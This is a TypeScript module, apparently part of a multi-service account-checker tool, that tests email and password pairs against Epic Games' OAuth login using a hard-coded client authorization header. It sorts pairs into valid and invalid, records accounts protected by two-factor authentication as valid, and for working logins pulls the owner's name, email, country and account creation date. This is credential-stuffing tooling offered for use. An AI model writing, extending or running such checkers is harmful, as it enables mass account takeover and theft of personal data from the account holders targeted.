import { BaseChecker } from './base';
import { CheckResult } from '@/types';

export class EpicGamesChecker extends BaseChecker {
  async check(email: string, password: string): Promise<CheckResult> {
    try {
      // Epic Games OAuth login
      const loginResponse = await this.client.post(
        'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token',
        {
          grant_type: 'password',
          username: email,
          password: password,
        },
        {
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            Authorization: 'basic MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE=',
          },
        }
      );

      if (loginResponse.data?.access_token) {
        // Get account details
        const capture = await this.getAccountDetails(
          loginResponse.data.access_token,
          loginResponse.data.account_id
        );
        
        return this.createResult(email, password, 'epic', 'valid', capture);
      }

      return this.createResult(email, password, 'epic', 'invalid');
    } catch (error: any) {
      const errorCode = error.response?.data?.errorCode;
      
      if (errorCode === 'errors.com.epicgames.account.two_factor_authentication.required') {
        return this.createResult(email, password, 'epic', 'valid', {
          twoFactorEnabled: true,
        });
      }

      return this.createResult(
        email,
        password,
        'epic',
        'error',
        undefined,
        error.message
      );
    }
  }

  private async getAccountDetails(accessToken: string, accountId: string) {
    try {
      const response = await this.client.get(
        `https://account-public-service-prod.ol.epicgames.com/account/api/public/account/${accountId}`,
        {
          headers: {
            Authorization: `Bearer ${accessToken}`,
          },
        }
      );

      return {
        username: response.data?.displayName,
        email: response.data?.email,
        emailVerified: response.data?.emailVerified,
        country: response.data?.country,
        createdDate: response.data?.minorExpected ? undefined : response.data?.created,
      };
    } catch {
      return {};
    }
  }
}
